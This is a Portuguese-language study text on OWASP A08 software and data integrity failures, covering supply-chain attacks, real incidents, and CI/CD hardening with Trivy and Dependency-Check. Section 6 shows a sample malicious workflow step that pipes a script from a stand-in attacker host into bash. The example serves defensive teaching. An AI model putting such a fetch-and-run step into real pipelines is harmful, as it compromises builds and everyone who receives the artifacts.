# P2-17 - OWASP Top Ten: Software and Data Integrity Failures

## 1. Introducao

Software and Data Integrity Failures e a categoria A08:2021 do OWASP Top 10. Ela trata de falhas em que a aplicacao confia em software, dados, atualizacoes, plugins, bibliotecas, pipelines ou objetos serializados sem verificar origem, integridade e autorizacao. O problema central e confiar que algo recebido ou executado e legitimo sem comprovar isso tecnicamente.

Integridade significa que um dado ou artefato nao foi alterado indevidamente. No contexto de software, isso inclui garantir que:

- dependencias vieram de fonte confiavel;
- pacotes nao foram adulterados;
- builds foram gerados a partir do codigo correto;
- imagens de container correspondem ao artefato aprovado;
- atualizacoes sao assinadas;
- dados persistidos ou trafegados nao foram modificados;
- objetos desserializados nao executam comportamento inesperado.

A ausencia de verificacao de integridade e confiabilidade representa risco porque atualizacoes, bibliotecas e plugins normalmente rodam com os mesmos privilegios da aplicacao. Se um atacante compromete uma dependencia ou o processo de build, o codigo malicioso pode chegar a producao como se fosse uma versao legitima.

## 2. Ataques relacionados

### CI/CD pipeline attacks

Um ataque ao pipeline de CI/CD ocorre quando o invasor manipula o processo de build, teste, assinatura, publicacao ou deploy. Exemplos:

- roubo de token do GitHub Actions, GitLab CI ou Jenkins;
- alteracao de script de build para incluir backdoor;
- publicacao de imagem Docker adulterada;
- uso de runner compartilhado sem isolamento;
- exposicao de segredos em logs de CI.

Se o pipeline nao valida origem, permissao e integridade, o invasor consegue inserir codigo malicioso no produto final sem necessariamente alterar a aplicacao de forma visivel.

### Dependency confusion

Dependency confusion ocorre quando um gerenciador de pacotes baixa uma dependencia publica maliciosa no lugar de uma dependencia privada interna, geralmente porque o pacote publico tem o mesmo nome e uma versao maior. O risco e maior quando o ambiente mistura registries publicos e privados sem regras claras de prioridade.

### Insecure deserialization

Desserializacao insegura acontece quando a aplicacao recebe dados serializados de fonte nao confiavel e os transforma em objetos sem validacao. Em algumas linguagens e frameworks, esse processo pode executar construtores, metodos especiais ou cadeias de objetos capazes de causar execucao remota de codigo, alteracao de estado, bypass de autenticacao ou negação de servico.

## 3. Carregar bibliotecas sem verificar origem e integridade

Permitir que bibliotecas e atualizacoes sejam carregadas sem verificacao significa aceitar pacotes apenas pelo nome, URL ou disponibilidade, sem validar assinatura digital, hash, registry permitido, versao aprovada ou proveniencia. Um exemplo inseguro seria baixar um script externo em producao com:

```html
<script src="https://cdn.exemplo-terceiro.com/plugin.js"></script>
```

Se esse script for adulterado, a aplicacao executara codigo de terceiro no navegador dos usuarios. Uma versao mais segura deve usar controle de origem, pinagem de versao e Subresource Integrity quando aplicavel:

```html
<script
  src="https://cdn.exemplo-terceiro.com/plugin-1.4.2.min.js"
  integrity="sha384-BASE64_DO_HASH_APROVADO"
  crossorigin="anonymous">
</script>
```

Em ambientes internos, a melhor pratica e usar registry privado, lockfile, hashes, revisao de dependencias, assinatura e processo formal de aprovacao.

## 4. Consequencias e sistemas mais criticos

As consequencias de falhas de integridade incluem:

- execucao de codigo malicioso em producao;
- roubo de credenciais e tokens;
- alteracao silenciosa de regras de negocio;
- fraudes financeiras;
- vazamento de dados;
- distribuicao de malware para clientes;
- perda de confianca no processo de release;
- indisponibilidade por sabotagem;
- dificuldade de investigacao, pois o artefato adulterado parece legitimo.

Cloud, containers e pipelines CI/CD sao especialmente criticos porque automatizam implantacoes e escalam rapidamente. Um token de CI com permissao ampla pode publicar imagens, alterar infraestrutura, acessar segredos e disparar deploys. Um container adulterado pode ser replicado em dezenas de ambientes. Um pacote comprometido pode atingir todos os servicos que o consomem.

## 5. Impactos de integridade, confidencialidade e disponibilidade

Falhas de integridade diferem de falhas de confidencialidade. Confidencialidade esta relacionada a impedir acesso indevido a dados. Integridade esta relacionada a impedir alteracao indevida de dados, codigo ou artefatos. Uma falha pode afetar ambas: uma biblioteca maliciosa pode modificar transacoes e tambem roubar dados.

Se um atacante executa codigo malicioso a partir de uma atualizacao automatizada, ele pode:

- criar usuario administrativo;
- exfiltrar dados;
- alterar validacoes;
- inserir backdoor;
- manipular logs;
- desativar controles de seguranca;
- afetar todos os clientes que recebem a atualizacao.

Quanto aos principios de seguranca:

- integridade: comprometida quando dados, builds ou pacotes sao adulterados;
- disponibilidade: comprometida se o artefato malicioso interrompe servicos;
- confiabilidade: comprometida quando a organizacao nao consegue provar que o que esta em producao veio do codigo aprovado.

Financeiramente, a empresa pode sofrer multas, indenizacoes, custo de resposta a incidente, perda de contratos, parada operacional e necessidade de reconstruir todo o pipeline. Reputacionalmente, a perda de confianca pode ser mais duradoura que o impacto tecnico imediato.

## 6. Exemplos reais e cenarios simulados

### Event-Stream

O ataque ao pacote `event-stream`, no ecossistema Node.js, ocorreu quando um pacote popular passou a incluir dependencia maliciosa apos transferencia de manutencao. O vetor foi cadeia de suprimentos: consumidores confiavam no pacote e suas dependencias transitivas. O codigo malicioso mirava um uso especifico relacionado a carteiras de criptomoedas. O erro principal foi confiar em uma dependencia popular sem controles suficientes sobre manutencao, mudancas e comportamento transitivo.

### SolarWinds Orion

No caso SolarWinds Orion, atacantes comprometeram o processo de build/distribuicao e inseriram codigo malicioso em atualizacoes assinadas e distribuidas aos clientes. O caso se relaciona diretamente a integridade de software porque o artefato final parecia legitimo para os consumidores. A licao central e que assinatura so protege se a cadeia antes da assinatura tambem for protegida; se o build ja esta comprometido, uma assinatura valida pode autenticar um artefato malicioso.

### Dependency confusion em empresas grandes

Pesquisas sobre dependency confusion mostraram que empresas como Apple e Microsoft podiam ser afetadas quando nomes de pacotes internos eram publicados em registries publicos com versoes mais altas. O gerenciador de pacotes poderia preferir o pacote publico e executar codigo externo. O erro foi nao isolar adequadamente registries internos, nomes de pacotes, prioridades e politicas de resolucao.

### Backdoors em CI/CD

Um backdoor pode ser introduzido se um atacante altera um workflow de CI para executar um comando extra:

```yaml
- name: Build
  run: mvn package

- name: Malicious step
  run: curl -s https://attacker.example/payload.sh | bash
```

Se mudancas em `.github/workflows/` nao exigem revisao forte, se segredos estao disponiveis para qualquer branch e se o runner tem permissao de publicacao, o ataque pode chegar ao artefato final.

## 7. Tecnicas de prevencao

Praticas recomendadas:

- assinar digitalmente pacotes, commits, releases e imagens;
- validar hashes e checksums de artefatos;
- usar lockfiles e versoes fixas;
- restringir registries permitidos;
- separar pacotes publicos de privados;
- usar SBOM para inventario;
- aplicar SCA com OWASP Dependency-Check, Trivy, Snyk ou ferramenta equivalente;
- exigir revisao em alteracoes de pipeline;
- limitar permissoes de tokens de CI;
- isolar runners;
- proteger branches principais;
- usar MFA para publicacao de pacotes;
- remover plugins desconhecidos ou sem manutencao;
- bloquear dependencias sem licenca, sem origem ou sem reputacao minima;
- armazenar segredos em cofre apropriado;
- gerar proveniencia de builds.

Assinar digitalmente um pacote ou binario significa usar uma chave privada para produzir uma assinatura verificavel com chave publica. Isso permite confirmar quem publicou o artefato e se ele foi alterado depois da assinatura.

SLSA, Supply Chain Levels for Software Artifacts, ajuda definindo niveis de maturidade para cadeia de suprimentos: builds scriptados, controle de origem, proveniencia, isolamento e resistencia contra adulteracao. Metadados de proveniencia indicam qual commit, workflow, builder e parametros produziram um artefato.

## 8. Politicas de CI/CD

Politicas essenciais:

- `main` e `release` devem exigir pull request e revisao;
- mudancas em pipeline devem exigir aprovacao de responsavel de seguranca ou plataforma;
- tokens devem ter permissao minima e curta duracao;
- secrets nao devem estar disponiveis para forks nao confiaveis;
- artefatos devem ser assinados;
- imagens devem ser escaneadas antes do deploy;
- deploy deve usar apenas artefatos gerados pelo pipeline oficial;
- deve haver trilha de auditoria entre commit, build, imagem e release.

Exemplo de GitHub Actions com verificacao de integridade:

```yaml
name: security-build

on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read
  security-events: write

jobs:
  verify:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Validate lockfiles
        run: |
          test -f package-lock.json || test -f pom.xml

      - name: Dependency scan
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: fs
          scan-ref: .
          severity: HIGH,CRITICAL
          exit-code: "1"

      - name: Build artifact
        run: npm ci && npm test && npm run build
```

Arquivos que devem ser monitorados:

- `package.json`, `package-lock.json`, `yarn.lock`, `pnpm-lock.yaml`;
- `pom.xml`, `build.gradle`;
- `requirements.txt`, `poetry.lock`, `Pipfile.lock`;
- `go.mod`, `go.sum`;
- `Dockerfile`, `docker-compose.yml`;
- `.github/workflows/*.yml`;
- scripts de build e deploy;
- manifests Kubernetes e Helm charts.

Alertas automatizados podem ser integrados via Dependabot, Renovate, Snyk, Trivy em CI, GitHub Advanced Security ou abertura automatica de tickets quando uma dependencia vulneravel e detectada.

## 9. Exemplo pratico com Dependency-Check e Trivy

Projeto Java:

```bash
dependency-check.sh \
  --project "api-pedidos" \
  --scan ./ \
  --format HTML \
  --out ./reports/dependency-check
```

Interpretação:

```text
Componente: biblioteca-x-1.0.0.jar
CVE: CVE-20XX-0001
Severidade: High
Evidencia: dependencia declarada em pom.xml
Acao: atualizar para 1.0.8 ou substituir componente
```

Projeto Node.js ou container:

```bash
trivy fs --severity HIGH,CRITICAL .
trivy image --severity HIGH,CRITICAL minha-api:latest
```

Se o Trivy encontra vulnerabilidade critica em pacote de sistema ou dependencia da aplicacao, o pipeline deve falhar ate que a imagem seja reconstruida com versao corrigida ou que exista aceite formal temporario.

## 10. Aplicacao em cenario real

Situacao: um desenvolvedor adiciona uma biblioteca desconhecida para resolver rapidamente uma validacao.

Resposta do time DevSecOps:

1. Bloquear o merge ate revisao.
2. Verificar origem, mantenedor, licenca, popularidade e historico.
3. Analisar dependencias transitivas.
4. Rodar SCA e secret scanning.
5. Avaliar se ha alternativa interna ou biblioteca mais madura.
6. Exigir pinagem de versao e lockfile.
7. Documentar decisao.

Politica organizacional de bibliotecas externas:

- dependencias novas precisam de justificativa;
- bibliotecas sem manutencao nao devem ser aprovadas;
- pacotes devem vir de registries permitidos;
- versoes devem ser fixadas;
- atualizacoes devem ser testadas;
- dependencias criticas devem ter dono interno;
- SBOM deve ser gerada por release;
- excecoes devem expirar.

Pontos vulneraveis em CI/CD:

- secrets disponiveis para qualquer branch;
- workflow alteravel sem revisao;
- runner com acesso amplo a rede interna;
- publicacao de pacote sem assinatura;
- deploy baseado em tag nao protegida;
- falta de rastreabilidade entre commit e artefato;
- imagens baixadas por tag mutavel, como `latest`.

## 11. Conclusao

Falhas de integridade de software e dados mostram que seguranca nao termina no codigo da aplicacao. Dependencias, builds, imagens, pipelines, plugins, dados serializados e processos de distribuicao tambem precisam de controles. Um desenvolvedor pode reduzir o risco usando dependencias confiaveis, lockfiles, assinaturas, SCA, revisao de pipeline, menor privilegio e validacao de dados nao confiaveis.

Assinaturas digitais ajudam a provar origem e detectar adulteracao. Versionamento e lockfiles tornam builds reproduziveis. Controles de CI/CD impedem que mudancas nao revisadas cheguem a producao. Em conjunto, essas medidas criam uma cadeia de confianca verificavel entre codigo, build, artefato e ambiente de execucao.
